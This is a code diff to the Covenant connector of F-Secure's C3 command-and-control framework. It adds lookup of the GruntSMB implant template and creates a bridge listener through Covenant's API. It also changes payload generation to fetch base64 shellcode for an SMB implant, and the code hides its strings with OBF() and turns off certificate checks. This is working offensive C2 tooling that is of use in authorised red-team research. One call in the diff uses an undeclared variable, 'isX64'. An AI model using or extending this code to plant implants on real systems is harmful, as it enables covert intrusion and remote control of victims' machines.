@@ -91,13 +91,18 @@ namespace FSecure::C3::Interfaces::Connectors
 		/// @param delay number of seconds for SMB grunt to block for
 		/// @param jitter percent to jitter the delay by
 		/// @param listenerId the id of the Bridge listener for covenant
+		/// @param isX64 whether to use 64 or x86 arch
 		/// @return generated payload.
-		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts);
+		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts, bool isX64);
 
 		/// Close desired connection
 		/// @arguments arguments for command. connection Id in string form.
 		/// @returns ByteVector empty vector.
 		FSecure::ByteVector CloseConnection(ByteView arguments);
+
+		bool UpdateListenerId();
+
+		bool UpdateTemplateId();
 
 		/// Initializes Sockets library. Can be called multiple times, but requires corresponding number of calls to DeinitializeSockets() to happen before closing the application.
 		/// @return value forwarded from WSAStartup call (zero if successful).
@@ -125,8 +130,11 @@ namespace FSecure::C3::Interfaces::Connectors
 		///API token, generated on logon.
 		std::string m_token;
 
-		///member for listener
+		///member for Covenant Listener ID
 		int m_ListenerId;
+
+		///member for Grunt SMB Template ID
+		int m_TemplateId;
 
 		/// Access mutex for m_ConnectionMap.
 		std::mutex m_ConnectionMapAccess;
@@ -137,8 +145,46 @@ namespace FSecure::C3::Interfaces::Connectors
 		/// Map of all connections.
 		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;
 
-		bool UpdateListenerId();
 	};
+}
+
+bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateTemplateId()
+{
+	std::string url = this->m_webHost + OBF("/api/implanttemplates");
+	std::pair<std::string, uint16_t> data;
+	json response;
+
+	web::http::client::http_client_config config;
+	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.
+
+	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
+	web::http::http_request request;
+
+	request = web::http::http_request(web::http::methods::GET);
+
+	std::string authHeader = OBF("Bearer ") + this->m_token;
+	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
+	pplx::task<web::http::http_response> task = webClient.request(request);
+
+	web::http::http_response resp = task.get();
+
+	if (resp.status_code() != web::http::status_codes::OK)
+		throw std::exception((OBF("[Covenant] Error getting Listeners, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
+
+	//Get the json response
+	auto respData = resp.extract_string();
+	response = json::parse(respData.get());
+
+	for (auto& listeners : response)
+	{
+		if (listeners[OBF("name")] != OBF("GruntSMB"))
+			continue;
+
+		this->m_TemplateId = listeners[OBF("id")].get<int>();
+		return true;
+	}
+
+	return false; //we didn't find the template
 }
 
 bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateListenerId()
@@ -230,6 +276,11 @@ FSecure::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 	else
 		throw std::exception(OBF("[Covenant] Could not get token, invalid logon"));
 
+	if (!UpdateTemplateId())
+	{
+		throw std::exception(OBF("[Covenant] Cannot find the GruntSMB template..."));
+	}
+
 	//If the listener doesn't already exist create it.
 	if (!UpdateListenerId())
 	{
@@ -239,23 +290,34 @@ FSecure::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 		end = url.find(":", start + 1);
 
 		if (start == std::string::npos || end == std::string::npos || end > url.size())
-			throw std::exception(OBF("[Covenenat] Incorrect URL, must be of the form http|https://hostname|ip:port - eg https://192.168.133.171:7443"));
+			throw std::exception(OBF("[Covenant] Incorrect URL, must be of the form http|https://hostname|ip:port - eg https://192.168.133.171:7443"));
 
 		this->m_ListeningPostAddress = url.substr(start, end - start);
 
 		///Create the bridge listener
-		url = this->m_webHost + OBF("/listener/createbridge");
+		url = this->m_webHost + OBF("/api/listeners/bridge");
+
 		web::http::client::http_client webClientBridge(utility::conversions::to_string_t(url), config);
 		request = web::http::http_request(web::http::methods::POST);
-		request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/x-www-form-urlencoded")));
+		request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
 
 		std::string authHeader = OBF("Bearer ") + this->m_token;
 		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
 
-		std::string createBridgeString = "Id=0&GUID=b85ea642f2&ListenerTypeId=2&Status=Active&CovenantToken=&Description=A+Bridge+for+custom+listeners.&Name=C3Bridge&BindAddress=0.0.0.0&BindPort=" + \
-			std::to_string(this->m_ListeningPostPort) + "&ConnectPort=" + std::to_string(this->m_ListeningPostPort) + "&ConnectAddresses%5B0%5D=" + \
-			this->m_ListeningPostAddress + "&ProfileId=3";
-		request.set_body(utility::conversions::to_string_t(createBridgeString));
+		//The data to create a bridge listener
+		json postData;
+		postData[OBF("name")] = OBF("C3Bridge");
+		postData[OBF("guid")] = OBF("b85ea642f2");
+		postData[OBF("description")] = OBF("A bridge for custom listeners");
+		postData[OBF("bindAddress")] = OBF("0.0.0.0");
+		postData[OBF("bindPort")] = this->m_ListeningPostPort;
+		postData[OBF("connectAddresses")] = { this->m_ListeningPostAddress };
+		postData[OBF("connectPort")] = this->m_ListeningPostPort;
+		postData[OBF("status")] = OBF("Active");
+		postData[OBF("listenerTypeId")] = 2;
+		postData[OBF("profileId")] = 3;
+
+		request.set_body(utility::conversions::to_string_t(postData.dump()));
 
 		task = webClientBridge.request(request);
 		resp = task.get();
@@ -267,8 +329,7 @@ FSecure::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 				throw std::exception((OBF("[Covenant] Error getting ListenerID after creation")));
 
 	}
-	//Set the listening address to the C2-Bridge on localhost
-	this->m_ListeningPostAddress = "127.0.0.1";
+
 	InitializeSockets();
 }
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -308,37 +369,35 @@ bool FSecure::C3::Interfaces::Connectors::Covenant::DeinitializeSockets()
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts)
+FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts, bool arch64)
 {
 	if (binderId.empty() || pipename.empty())
 		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };
 
 	std::string authHeader = OBF("Bearer ") + this->m_token;
-	std::string contentHeader = OBF("Content-Type: application/json");
-	std::string binary;
+	ByteVector payload;
 
 	web::http::client::http_client_config config;
 	config.set_validate_certificates(false);
-	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/launchers/binary")), config);
+	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/launchers/shellcode")), config);
 	web::http::http_request request;
 
 	//The data to create an SMB Grunt
 	json postData;
-	postData[OBF("id")] = this->m_ListenerId;
 	postData[OBF("smbPipeName")] = pipename;
 	postData[OBF("listenerId")] = this->m_ListenerId;
-	postData[OBF("outputKind")] = OBF("ConsoleApplication");
-	postData[OBF("implantTemplateId")] = 2; //for GruntSMB template
-	postData[OBF("dotNetFrameworkVersion")] = OBF("Net40");
-	postData[OBF("type")] = OBF("Wmic");
+	postData[OBF("implantTemplateId")] = this->m_TemplateId; // GruntSMB template default
+	postData[OBF("dotNetVersion")] = OBF("Net40");
+	//postData[OBF("runtimeIdentifier")] = arch64 ? OBF("win_x64") : OBF("win_x86"); // Donut uses Arch 3 which ix x86_64
 	postData[OBF("delay")] = delay;
 	postData[OBF("jitterPercent")] = jitter;
 	postData[OBF("connectAttempts")] = connectAttempts;
+	// Should Specify killDate here? Defaults to 1 month.
 
-	//First we use a PUT to add our data as the template.
-	request = web::http::http_request(web::http::methods::PUT);
 	try
 	{
+		// We send a PUT to set the parameters
+		request = web::http::http_request(web::http::methods::PUT);
 		request.headers().set_content_type(utility::conversions::to_string_t("application/json"));
 		request.set_body(utility::conversions::to_string_t(postData.dump()));
 
@@ -346,35 +405,54 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePaylo
 		pplx::task<web::http::http_response> task = webClient.request(request);
 		web::http::http_response resp = task.get();
 
-		//If we get 200 OK, then we use a POST to request the generation of the payload. We can reuse the previous data here.
-		if (resp.status_code() == web::http::status_codes::OK)
+		if (resp.status_code() != web::http::status_codes::OK)
 		{
-			request.set_method(web::http::methods::POST);
-			task = webClient.request(request);
-			resp = task.get();
-
-			if (resp.status_code() == web::http::status_codes::OK)
-			{
-				auto respData = resp.extract_string();
-				json resp = json::parse(respData.get());
-				binary = resp[OBF("base64ILByteString")].get<std::string>(); //Contains the base64 encoded .NET assembly.
-			}
-			else
-				throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));
+			throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned setting the payload: ") + std::to_string(resp.status_code()));
 		}
-		else
-			throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));
 
-		auto payload = cppcodec::base64_rfc4648::decode(binary);
+		//If we get 200 OK, then generate the payload with a POST request
+		request = web::http::http_request(web::http::methods::POST);
+		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
+		task = webClient.request(request);
+		resp = task.get();
+
+		if (resp.status_code() != web::http::status_codes::OK)
+		{
+			throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned generating payload: ") + std::to_string(resp.status_code()));
+		}
+
+		auto respData = resp.extract_string();
+		json response = json::parse(respData.get());
+
+		// Requires modification to Covenant Model/Launcher/ShellCodeLauncher.cs:50
+		//          this.LauncherString = Convert.ToBase64String(File.ReadAllBytes(outputf));//template.Name + ".bin";
+		std::string base64Payload = response[OBF("launcherString")]; // Could maybe become Base64ILByteString if API fixed
+		
+		try
+		{
+			payload = cppcodec::base64_rfc4648::decode(base64Payload);
+		}
+		catch (std::exception&)
+		{
+			throw std::exception(OBF("[Covenant] Error base64 decoding payload"));
+		}
 
 		//Finally connect to the socket.
-		auto connection = std::make_shared<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<Covenant>(shared_from_this()), binderId);
-		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
+		try
+		{
+			auto connection = std::make_shared<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<Covenant>(shared_from_this()), binderId);
+			m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
+		}
+		catch (std::exception&)
+		{
+			throw std::exception(OBF("[Covenant] Error connecting to Covenant Bridge"));
+		}
+
 		return payload;
 	}
-	catch(std::exception&)
+	catch(std::exception& e)
 	{
-		throw std::exception(OBF("Error generating payload"));
+		throw e;
 	}
 }
 
@@ -467,7 +545,7 @@ FSecure::C3::Interfaces::Connectors::Covenant::Connection::Connection(std::strin
 	sockaddr_in client;
 	client.sin_family = AF_INET;
 	client.sin_port = htons(listeningPostPort);
-	switch (InetPtonA(AF_INET, &listeningPostAddress.front(), &client.sin_addr.s_addr))									//< Mod to solve deprecation issue.
+	switch (InetPtonA(AF_INET, &listeningPostAddress.front(), &client.sin_addr.s_addr))			//< Mod to solve deprecation issue.
 	{
 	case 0:
 		throw std::invalid_argument(OBF("Provided Listening Post address in not a valid IPv4 dotted - decimal string or a valid IPv6 address."));
@@ -550,30 +628,29 @@ void FSecure::C3::Interfaces::Connectors::Covenant::Connection::StartUpdatingInS
 {
 	m_SecondThreadStarted = true;
 	std::thread([this]()
+	{
+		// Lock pointers.
+		auto owner = m_Owner.lock();
+		auto bridge = owner->GetBridge();
+		auto self = shared_from_this();
+
+		while (bridge->IsAlive() && self.use_count() > 1)
 		{
-			// Lock pointers.
-			auto owner = m_Owner.lock();
-			auto bridge = owner->GetBridge();
-			auto self = shared_from_this();
-			while (bridge->IsAlive() && self.use_count() > 1)
+			std::this_thread::sleep_for(std::chrono::milliseconds{ 10 });
+			try
 			{
-				try
+				// Read packet and post it to Binder.
+				if (auto packet = Receive(); !packet.empty())
 				{
-					// Read packet and post it to Binder.
-					if (auto packet = Receive(); !packet.empty())
-					{
-						if (packet.size() == 1u && packet[0] == 0u)
-							Send(packet);
-						else
-							bridge->PostCommandToBinder(ByteView{ m_Id }, packet);
-					}
-				}
-				catch (std::exception& e)
-				{
-					bridge->Log({ e.what(), LogMessage::Severity::Error });
+					bridge->PostCommandToBinder(ByteView{ m_Id }, packet);
 				}
 			}
-		}).detach();
+			catch (std::exception& e)
+			{
+				bridge->Log({ e.what(), LogMessage::Severity::Error });
+			}
+		}
+	}).detach();
 }
 
 bool FSecure::C3::Interfaces::Connectors::Covenant::Connection::SecondThreadStarted()
@@ -586,7 +663,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::PeripheralCre
 	auto [pipeName, delay, jitter, connectAttempts] = data.Read<std::string, uint32_t, uint32_t, uint32_t>();
 
 
-	return ByteVector{}.Write(pipeName, GeneratePayload(connectionId, pipeName, delay, jitter, connectAttempts), connectAttempts);
+	return ByteVector{}.Write(pipeName, GeneratePayload(connectionId, pipeName, delay, jitter, connectAttempts, isX64), connectAttempts);
 }
 
 
